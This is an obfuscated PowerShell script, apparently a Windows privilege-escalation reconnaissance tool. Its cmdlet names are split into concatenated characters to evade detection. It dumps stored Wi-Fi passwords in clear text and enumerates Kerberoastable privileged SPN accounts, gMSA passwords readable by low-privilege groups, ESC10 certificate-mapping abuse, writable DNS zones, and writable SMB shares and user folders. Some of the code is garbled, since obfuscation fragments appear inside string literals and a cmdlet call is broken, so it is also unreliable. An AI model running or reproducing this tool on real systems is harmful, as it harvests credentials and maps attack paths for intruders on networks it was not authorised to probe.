if ($KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk) { $KyIUEwgZgWOTSqjLLOpnzdDmFtnftpUJeUoaFZnNNmuxtkHLszDCTAagqgUbqkrHMoVkJbiIHNIdVWWoCuuGMyUHkmNfvxcTXZuk }
elseif (&('T' + 'e' + 's' + 't' + '-' + 'P' + 'a' + 't' + 'h') 'C:\Windows\CCM\SCClient.exe') { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "SCCM Client found at C:\Windows\CCM\SCClient.exe" -ForegroundColor Cyan }
else { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Not Installed." }


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| NETWORK INFORMATION"

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| HOSTS FILE"

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Get content of etc\hosts file"
&('G' + 'e' + 't' + '-' + 'C' + 'o' + 'n' + 't' + 'e' + 'n' + 't') "c:\windows\system32\drivers\etc\hosts"

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| IP INFORMATION"

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Ipconfig ALL"
&('S' + 't' + 'a' + 'r' + 't' + '-' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's') ipconfig.exe -ArgumentList "/all" -Wait -NoNewWindow


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| DNS Cache"
ipconfig /displaydns | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') "Record" | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $('{0}' -f $_) }
 
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| LISTENING PORTS"

&('S' + 't' + 'a' + 'r' + 't' + '-' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's') NETSTAT.EXE -ArgumentList "-ano" -Wait -NoNewWindow


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| ACTIVE DIRECTORY / IDENTITY MISCONFIG CHECKS"

$domainContext = &('G' + 'e' + 't' + '-' + 'D' + 'o' + 'm' + 'a' + 'i' + 'n' + 'C' + 'o' + 'n' + 't' + 'e' + 'x' + 't')
if (-not $domainContext) {
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Host appears to be in a workgroup or the AD context could not be resolved. Skipping &('d' + 'o' + 'm' + 'a' + 'i' + 'n' + '-' + 's' + 'p' + 'e' + 'c' + 'i' + 'f' + 'i' + 'c') checks." -ForegroundColor DarkGray
}
else {
  $CunXYjJTKtBEYmmmZQTomqTiLDQHABqbzsEmjTdtthsJaFSNMpavQqfVoJtpaMdETkMLVZDHHNwNSmPqirYmmTPSjbpSHIQokMyq = &('G' + 'e' + 't' + '-' + 'N' + 't' + 'l' + 'm' + 'P' + 'o' + 'l' + 'i' + 'c' + 'y' + 'S' + 'u' + 'm' + 'm' + 'a' + 'r' + 'y')
  if ($CunXYjJTKtBEYmmmZQTomqTiLDQHABqbzsEmjTdtthsJaFSNMpavQqfVoJtpaMdETkMLVZDHHNwNSmPqirYmmTPSjbpSHIQokMyq) {
    $OhhvIgamXOPAPjLoVAUicnZxYmieBlJvHPRwuMcDLkcNufxGHpPBcaVQtnjyDZeGodCfqGrjpUAvNVQKbzXvUObschjASUNxyIXc = if ($CunXYjJTKtBEYmmmZQTomqTiLDQHABqbzsEmjTdtthsJaFSNMpavQqfVoJtpaMdETkMLVZDHHNwNSmPqirYmmTPSjbpSHIQokMyq.RestrictReceiving -ne $null) { [int]$CunXYjJTKtBEYmmmZQTomqTiLDQHABqbzsEmjTdtthsJaFSNMpavQqfVoJtpaMdETkMLVZDHHNwNSmPqirYmmTPSjbpSHIQokMyq.RestrictReceiving } else { -1 }
    $jRCHEuhESGiDMkwPoheCXLbMunhEPUPlpPlxkatcgULfXfngeQJmtnApxHOaCEEYSqYyyHTuaCpvBOJMhDSPEhknKjjlbbdnvjFT = if ($CunXYjJTKtBEYmmmZQTomqTiLDQHABqbzsEmjTdtthsJaFSNMpavQqfVoJtpaMdETkMLVZDHHNwNSmPqirYmmTPSjbpSHIQokMyq.RestrictSending -ne $null) { [int]$CunXYjJTKtBEYmmmZQTomqTiLDQHABqbzsEmjTdtthsJaFSNMpavQqfVoJtpaMdETkMLVZDHHNwNSmPqirYmmTPSjbpSHIQokMyq.RestrictSending } else { -1 }
    $ORaZklVvVMxCgENpJLquzSuaBnUnetjSpdwvBhoGfAFxtqEKDWGCGNPSYfmsSwPdhMYUpKKnFayERULIWtOrCgejCwflMqDyeQEZ = if ($CunXYjJTKtBEYmmmZQTomqTiLDQHABqbzsEmjTdtthsJaFSNMpavQqfVoJtpaMdETkMLVZDHHNwNSmPqirYmmTPSjbpSHIQokMyq.LmCompatibility -ne $null) { [int]$CunXYjJTKtBEYmmmZQTomqTiLDQHABqbzsEmjTdtthsJaFSNMpavQqfVoJtpaMdETkMLVZDHHNwNSmPqirYmmTPSjbpSHIQokMyq.LmCompatibility } else { -1 }
    $fAlNNRKDgiPKLrcGTYePMrVcFegQgyZMVTGOFqAcBWxOctHnacWGYevVnWTWBZqsfyvYruUFdCMeUcfTmJiEgqTkStbdpZyffZCl = "Receiving:{0} Sending:{1} LMCompat:{2}" -f $OhhvIgamXOPAPjLoVAUicnZxYmieBlJvHPRwuMcDLkcNufxGHpPBcaVQtnjyDZeGodCfqGrjpUAvNVQKbzXvUObschjASUNxyIXc, $jRCHEuhESGiDMkwPoheCXLbMunhEPUPlpPlxkatcgULfXfngeQJmtnApxHOaCEEYSqYyyHTuaCpvBOJMhDSPEhknKjjlbbdnvjFT, $ORaZklVvVMxCgENpJLquzSuaBnUnetjSpdwvBhoGfAFxtqEKDWGCGNPSYfmsSwPdhMYUpKKnFayERULIWtOrCgejCwflMqDyeQEZ
    if ($OhhvIgamXOPAPjLoVAUicnZxYmieBlJvHPRwuMcDLkcNufxGHpPBcaVQtnjyDZeGodCfqGrjpUAvNVQKbzXvUObschjASUNxyIXc -ge 1 -or $jRCHEuhESGiDMkwPoheCXLbMunhEPUPlpPlxkatcgULfXfngeQJmtnApxHOaCEEYSqYyyHTuaCpvBOJMhDSPEhknKjjlbbdnvjFT -ge 1 -or $ORaZklVvVMxCgENpJLquzSuaBnUnetjSpdwvBhoGfAFxtqEKDWGCGNPSYfmsSwPdhMYUpKKnFayERULIWtOrCgejCwflMqDyeQEZ -ge 5) {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[!] NTLM is restricted/disabled ($fAlNNRKDgiPKLrcGTYePMrVcFegQgyZMVTGOFqAcBWxOctHnacWGYevVnWTWBZqsfyvYruUFdCMeUcfTmJiEgqTkStbdpZyffZCl). Expect &('K' + 'e' + 'r' + 'b' + 'e' + 'r' + 'o' + 's' + '-' + 'o' + 'n' + 'l' + 'y') auth paths (sync time before Kerberoasting)." -ForegroundColor Yellow
    }
    else {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[i] NTLM restrictions appear relaxed ($fAlNNRKDgiPKLrcGTYePMrVcFegQgyZMVTGOFqAcBWxOctHnacWGYevVnWTWBZqsfyvYruUFdCMeUcfTmJiEgqTkStbdpZyffZCl)."
    }
  }

  $AZyDISeeemvcogeIjFZUyUuRnNPzXEyWqAwUEnMjeRFrmJxPnWuolfhKghtZvkaRjuLOjvPRnDcOMXPUjZbDVMVaVhMoihhbeCMY = &('G' + 'e' + 't' + '-' + 'T' + 'i' + 'm' + 'e' + 'S' + 'k' + 'e' + 'w' + 'I' + 'n' + 'f' + 'o') -DomainContext $domainContext
  if ($AZyDISeeemvcogeIjFZUyUuRnNPzXEyWqAwUEnMjeRFrmJxPnWuolfhKghtZvkaRjuLOjvPRnDcOMXPUjZbDVMVaVhMoihhbeCMY) {
    $uBViSJBVdAlmNAxmLZpblsIvhbSVbfhfEjnzzrmDnHbDxlnItRycGvPPQwbWNtPtWajhMZAmroELQsjXQaEWdrLKBPrTFpZkNOpe = [math]::Abs($AZyDISeeemvcogeIjFZUyUuRnNPzXEyWqAwUEnMjeRFrmJxPnWuolfhKghtZvkaRjuLOjvPRnDcOMXPUjZbDVMVaVhMoihhbeCMY.OffsetSeconds)
    $eHmHYCTAQKXwtMTTJnmKKtobpvawmCdMzxsWgXwehtOLOSExScIPUHsIQNoydVXhLejilNvXFFvCIFjkukIAXrJQuvaoJOxsynSC = "Offset vs {0}: {1:N3}s (sample: {2})" -f $AZyDISeeemvcogeIjFZUyUuRnNPzXEyWqAwUEnMjeRFrmJxPnWuolfhKghtZvkaRjuLOjvPRnDcOMXPUjZbDVMVaVhMoihhbeCMY.Source, $AZyDISeeemvcogeIjFZUyUuRnNPzXEyWqAwUEnMjeRFrmJxPnWuolfhKghtZvkaRjuLOjvPRnDcOMXPUjZbDVMVaVhMoihhbeCMY.OffsetSeconds, $AZyDISeeemvcogeIjFZUyUuRnNPzXEyWqAwUEnMjeRFrmJxPnWuolfhKghtZvkaRjuLOjvPRnDcOMXPUjZbDVMVaVhMoihhbeCMY.RawSample.Trim()
    if ($uBViSJBVdAlmNAxmLZpblsIvhbSVbfhfEjnzzrmDnHbDxlnItRycGvPPQwbWNtPtWajhMZAmroELQsjXQaEWdrLKBPrTFpZkNOpe -gt 5) {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[!] Significant Kerberos time skew detected - $eHmHYCTAQKXwtMTTJnmKKtobpvawmCdMzxsWgXwehtOLOSExScIPUHsIQNoydVXhLejilNvXFFvCIFjkukIAXrJQuvaoJOxsynSC" -ForegroundColor Yellow
    }
    else {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[i] Kerberos time offset looks OK - $eHmHYCTAQKXwtMTTJnmKKtobpvawmCdMzxsWgXwehtOLOSExScIPUHsIQNoydVXhLejilNvXFFvCIFjkukIAXrJQuvaoJOxsynSC"
    }
  }

  $FrSUzJhmhUQgMSgWwuEfkpdGMxLCXWJaBwIEToJSJyIjhTVxHBsNKiKEOGhUzVpidkKXIpKSWFMCkYKxbjqiwkUvHiETPyopyNVP = @(&('G' + 'e' + 't' + '-' + 'W' + 'e' + 'a' + 'k' + 'D' + 'n' + 's' + 'U' + 'p' + 'd' + 'a' + 't' + 'e' + 'F' + 'i' + 'n' + 'd' + 'i' + 'n' + 'g' + 's') -DomainContext $domainContext)
  if ($FrSUzJhmhUQgMSgWwuEfkpdGMxLCXWJaBwIEToJSJyIjhTVxHBsNKiKEOGhUzVpidkKXIpKSWFMCkYKxbjqiwkUvHiETPyopyNVP.Count -gt 0) {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[!] &('A' + 'D' + '-' + 'i' + 'n' + 't' + 'e' + 'g' + 'r' + 'a' + 't' + 'e' + 'd') DNS zones allow &('l' + 'o' + 'w' + '-' + 'p' + 'r' + 'i' + 'v') principals to write records (dynamic DNS hijack / service MITM risk)." -ForegroundColor Yellow
    $FrSUzJhmhUQgMSgWwuEfkpdGMxLCXWJaBwIEToJSJyIjhTVxHBsNKiKEOGhUzVpidkKXIpKSWFMCkYKxbjqiwkUvHiETPyopyNVP | &('F' + 'o' + 'r' + 'm' + 'a' + 't' + '-' + 'T' + 'a' + 'b' + 'l' + 'e') Zone,Partition,Principal,Rights -AutoSize | &('O' + 'u' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') | &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't')
  }
  else {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[i] No obvious insecure dynamic DNS ACLs found with current privileges."
  }

  $HAyZRyPSMARqGhuqzXrwoYgGQzgnlFhxDkvQDRFZNoGPRfExKuBgFUNgolOwomLuVoqQVnYURwaTweNoBoWkFMLQQtOkBMELtUXj = @(&('G' + 'e' + 't' + '-' + 'P' + 'r' + 'i' + 'v' + 'i' + 'l' + 'e' + 'g' + 'e' + 'd' + 'S' + 'p' + 'n' + 'T' + 'a' + 'r' + 'g' + 'e' + 't' + 's') -DomainContext $domainContext)
  if ($HAyZRyPSMARqGhuqzXrwoYgGQzgnlFhxDkvQDRFZNoGPRfExKuBgFUNgolOwomLuVoqQVnYURwaTweNoBoWkFMLQQtOkBMELtUXj.Count -gt 0) {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[!] &('H' + 'i' + 'g' + 'h' + '-' + 'v' + 'a' + 'l' + 'u' + 'e') SPN accounts identified (prime Kerberoast targets):" -ForegroundColor Yellow
    $HAyZRyPSMARqGhuqzXrwoYgGQzgnlFhxDkvQDRFZNoGPRfExKuBgFUNgolOwomLuVoqQVnYURwaTweNoBoWkFMLQQtOkBMELtUXj | &('F' + 'o' + 'r' + 'm' + 'a' + 't' + '-' + 'T' + 'a' + 'b' + 'l' + 'e') User,Groups -AutoSize | &('O' + 'u' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') | &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't')
  }
  else {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[i] No privileged SPN users detected via quick LDAP search."
  }

  $rDsgLDDLqRxymYpslMcNXzoZlneLwPZxLQQZopvWJwHZejHJIXAdGvJcoNfPtlVEcciMkHhGHhecsZIsfciOwxFNXXNfcHiDXXFA = @(&('G' + 'e' + 't' + '-' + 'G' + 'm' + 's' + 'a' + 'R' + 'e' + 'a' + 'd' + 'e' + 'r' + 's' + 'R' + 'e' + 'p' + 'o' + 'r' + 't') -DomainContext $domainContext)
  if ($rDsgLDDLqRxymYpslMcNXzoZlneLwPZxLQQZopvWJwHZejHJIXAdGvJcoNfPtlVEcciMkHhGHhecsZIsfciOwxFNXXNfcHiDXXFA.Count -gt 0) {
    $LpOCfpVCvArQSzloavVvimWWNycDVEQbASwfLHwjwLbElUtBYtlCjjIDDFsqIknJzqFMwLKKbfMtDyjpGeWVuZknHizIpWlbshkX = $rDsgLDDLqRxymYpslMcNXzoZlneLwPZxLQQZopvWJwHZejHJIXAdGvJcoNfPtlVEcciMkHhGHhecsZIsfciOwxFNXXNfcHiDXXFA | &('W' + 'h' + 'e' + 'r' + 'e' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { $_.WeakPrincipals -ne "" }
    if ($LpOCfpVCvArQSzloavVvimWWNycDVEQbASwfLHwjwLbElUtBYtlCjjIDDFsqIknJzqFMwLKKbfMtDyjpGeWVuZknHizIpWlbshkX) {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[!] gMSA passwords readable by &('l' + 'o' + 'w' + '-' + 'p' + 'r' + 'i' + 'v') groups/principals: " -ForegroundColor Yellow
      $LpOCfpVCvArQSzloavVvimWWNycDVEQbASwfLHwjwLbElUtBYtlCjjIDDFsqIknJzqFMwLKKbfMtDyjpGeWVuZknHizIpWlbshkX | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') Account, WeakPrincipals | &('F' + 'o' + 'r' + 'm' + 'a' + 't' + '-' + 'T' + 'a' + 'b' + 'l' + 'e') -AutoSize | &('O' + 'u' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') | &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't')
    }
    else {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[i] gMSA accounts discovered (review allowed readers below)."
      $rDsgLDDLqRxymYpslMcNXzoZlneLwPZxLQQZopvWJwHZejHJIXAdGvJcoNfPtlVEcciMkHhGHhecsZIsfciOwxFNXXNfcHiDXXFA | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') Account, Allowed | &('S' + 'o' + 'r' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') Account | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -First 5 | &('F' + 'o' + 'r' + 'm' + 'a' + 't' + '-' + 'T' + 'a' + 'b' + 'l' + 'e') -Wrap | &('O' + 'u' + 't' + '-' + 'S' + 't' + 'r' + 'i' + 'n' + 'g') | &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't')
    }
  }
  else {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[i] No gMSA objects found via LDAP."
  }

  $zYLbUGbZTlaqHKOctOMlQPRxofjNOgMmWpFcTJvYWNXbniXGPrWKXeCGbwzEmqajuxhvlWfyMCYoSMuZuIQuGIJfFPhUpBWxgqJD = &('G' + 'e' + 't' + '-' + 'A' + 'd' + 'c' + 's' + 'S' + 'c' + 'h' + 'a' + 'n' + 'n' + 'e' + 'l' + 'I' + 'n' + 'f' + 'o')
  if ($zYLbUGbZTlaqHKOctOMlQPRxofjNOgMmWpFcTJvYWNXbniXGPrWKXeCGbwzEmqajuxhvlWfyMCYoSMuZuIQuGIJfFPhUpBWxgqJD.MappingValue -ne $null) {
    $kVeWNeqaMXWsPlPgzcoduDFOcCGUlSAgoqqSigpNxxHdxUlHusmMcVujMiiNdBjHItrXxLLoImDpewgGPUAXWobAecUhzdeHpicw = ('0x{0:X}' -f [int]$zYLbUGbZTlaqHKOctOMlQPRxofjNOgMmWpFcTJvYWNXbniXGPrWKXeCGbwzEmqajuxhvlWfyMCYoSMuZuIQuGIJfFPhUpBWxgqJD.MappingValue)
    if ($zYLbUGbZTlaqHKOctOMlQPRxofjNOgMmWpFcTJvYWNXbniXGPrWKXeCGbwzEmqajuxhvlWfyMCYoSMuZuIQuGIJfFPhUpBWxgqJD.UpnMapping) {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ("[!] Schannel CertificateMappingMethods={0} (UPN mapping allowed) - ESC10 certificate abuse possible if you can edit another user's UPN." -f $kVeWNeqaMXWsPlPgzcoduDFOcCGUlSAgoqqSigpNxxHdxUlHusmMcVujMiiNdBjHItrXxLLoImDpewgGPUAXWobAecUhzdeHpicw) -ForegroundColor Yellow
    }
    else {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ("[i] Schannel CertificateMappingMethods={0} (UPN mapping flag not set)." -f $kVeWNeqaMXWsPlPgzcoduDFOcCGUlSAgoqqSigpNxxHdxUlHusmMcVujMiiNdBjHItrXxLLoImDpewgGPUAXWobAecUhzdeHpicw)
    }
    if ($zYLbUGbZTlaqHKOctOMlQPRxofjNOgMmWpFcTJvYWNXbniXGPrWKXeCGbwzEmqajuxhvlWfyMCYoSMuZuIQuGIJfFPhUpBWxgqJD.ServiceState) {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ("[i] AD CS service state: {0}" -f $zYLbUGbZTlaqHKOctOMlQPRxofjNOgMmWpFcTJvYWNXbniXGPrWKXeCGbwzEmqajuxhvlWfyMCYoSMuZuIQuGIJfFPhUpBWxgqJD.ServiceState)
    }
  }
  else {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "[i] Could not read Schannel certificate mapping configuration." -ForegroundColor DarkGray
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| ARP Table"

&('S' + 't' + 'a' + 'r' + 't' + '-' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's') arp -ArgumentList "-A" -Wait -NoNewWindow

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Routes"

&('S' + 't' + 'a' + 'r' + 't' + '-' + 'P' + 'r' + 'o' + 'c' + 'e' + 's' + 's') route -ArgumentList "print" -Wait -NoNewWindow

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Network Adapter info"

&('G' + 'e' + 't' + '-' + 'N' + 'e' + 't' + 'A' + 'd' + 'a' + 'p' + 't' + 'e' + 'r') | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') { 
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "----------"
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $_.Name
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $_.InterfaceDescription
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $_.ifIndex
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $_.Status
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') $_.MacAddress
  &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "----------"
} 


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Checking for WiFi passwords"

((netsh.exe wlan show profiles) -match '\s{2,}:\s').replace("    All User Profile     : ", "") | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  netsh wlan show profile name="$_" key=clear 
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| Enabled firewall rules - displaying command only - it can overwrite the display buffer"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| show all rules with: netsh advfirewall firewall show rule dir=in name=all"

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| SMB SHARES"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "Will enumerate SMB Shares and Access if any are available" 

&('G' + 'e' + 't' + '-' + 'S' + 'm' + 'b' + 'S' + 'h' + 'a' + 'r' + 'e') | &('G' + 'e' + 't' + '-' + 'S' + 'm' + 'b' + 'S' + 'h' + 'a' + 'r' + 'e')Access | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  $jaOeuvoaajWxrEIFpyJdlqPezDyZmkOcuvTwflvZlLBrntifswffeVZvlnCFAsBeIgSerjGHSgWfwTjiUHXBPfwMdxLotUIDIkfF = $_
  whoami.exe /groups /fo csv | &('s' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'o' + 'b' + 'j' + 'e' + 'c' + 't') -skip 2 | &('C' + 'o' + 'n' + 'v' + 'e' + 'r' + 't' + 'F' + 'r' + 'o' + 'm' + '-' + 'C' + 's' + 'v') -Header 'group name' | &('S' + 'e' + 'l' + 'e' + 'c' + 't' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') -ExpandProperty 'group name' | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
    if ($jaOeuvoaajWxrEIFpyJdlqPezDyZmkOcuvTwflvZlLBrntifswffeVZvlnCFAsBeIgSerjGHSgWfwTjiUHXBPfwMdxLotUIDIkfF.AccountName -like $_ -and ($jaOeuvoaajWxrEIFpyJdlqPezDyZmkOcuvTwflvZlLBrntifswffeVZvlnCFAsBeIgSerjGHSgWfwTjiUHXBPfwMdxLotUIDIkfF.AccessRight -like "Full" -or "Change") -and $jaOeuvoaajWxrEIFpyJdlqPezDyZmkOcuvTwflvZlLBrntifswffeVZvlnCFAsBeIgSerjGHSgWfwTjiUHXBPfwMdxLotUIDIkfF.AccessControlType -like "Allow" ) {
      &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor red "$($jaOeuvoaajWxrEIFpyJdlqPezDyZmkOcuvTwflvZlLBrntifswffeVZvlnCFAsBeIgSerjGHSgWfwTjiUHXBPfwMdxLotUIDIkfF.AccountName) has $($jaOeuvoaajWxrEIFpyJdlqPezDyZmkOcuvTwflvZlLBrntifswffeVZvlnCFAsBeIgSerjGHSgWfwTjiUHXBPfwMdxLotUIDIkfF.AccessRight) to $($jaOeuvoaajWxrEIFpyJdlqPezDyZmkOcuvTwflvZlLBrntifswffeVZvlnCFAsBeIgSerjGHSgWfwTjiUHXBPfwMdxLotUIDIkfF.Name)"
    }
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| USER INFO"
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') "== || Generating List of all Local Administrators, Users and Backup Operators (if any exist)"

&('G' + 'e' + 't' + '-' + 'L' + 'o' + 'c' + 'a' + 'l' + 'G' + 'r' + 'o' + 'u' + 'p') | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  "`n Group: $($_.Name) `n"
  if(&('G' + 'e' + 't' + '-' + 'L' + 'o' + 'c' + 'a' + 'l' + 'G' + 'r' + 'o' + 'u' + 'p' + 'M' + 'e' + 'm' + 'b' + 'e' + 'r') -name $_.Name){
    (&('G' + 'e' + 't' + '-' + 'L' + 'o' + 'c' + 'a' + 'l' + 'G' + 'r' + 'o' + 'u' + 'p' + 'M' + 'e' + 'm' + 'b' + 'e' + 'r') -name $_.Name).Name
  }
  else{
    "     {GROUP EMPTY}"
  }
}


&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
if ($TimeStamp) { TimeElapsed }
&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor Blue "=========|| USER DIRECTORY ACCESS CHECK"
&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') C:\Users\* | &('F' + 'o' + 'r' + 'E' + 'a' + 'c' + 'h' + '-' + 'O' + 'b' + 'j' + 'e' + 'c' + 't') {
  if (&('G' + 'e' + 't' + '-' + 'C' + 'h' + 'i' + 'l' + 'd' + 'I' + 't' + 'e' + 'm') $_.FullName -ErrorAction SilentlyContinue) {
    &('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') -ForegroundColor red "Read Access to $($_.FullName)"
  }
}

&('W' + 'r' + 'i' + 't' + 'e' + '-' + 'H' + 'o' + 's' + 't') ""
